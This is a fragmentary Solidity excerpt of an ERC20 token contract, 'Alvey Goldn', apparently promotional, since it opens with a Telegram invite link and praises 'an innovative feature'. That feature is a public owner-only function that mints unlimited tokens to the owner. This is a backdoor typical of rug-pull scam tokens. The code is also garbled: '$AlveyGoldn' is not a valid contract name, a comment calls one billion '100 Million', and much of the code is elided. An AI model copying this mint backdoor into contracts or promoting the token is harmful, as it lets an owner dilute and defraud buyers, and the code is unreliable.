//
// $AlveyGoldn proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/+cVTvAyagjjlkNDVl
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _AlveyGoldn(uint256 amount) public onlyOwner {
 _AlveyGoldn(msg.sender, amount);
    }
    ...
    function _AlveyGoldn(address account, uint256 amount) internal virtual {
...
contract $AlveyGoldn is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Alvey Goldn", " ALVEYGOLDN ") {
     _AlveyGoldn(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}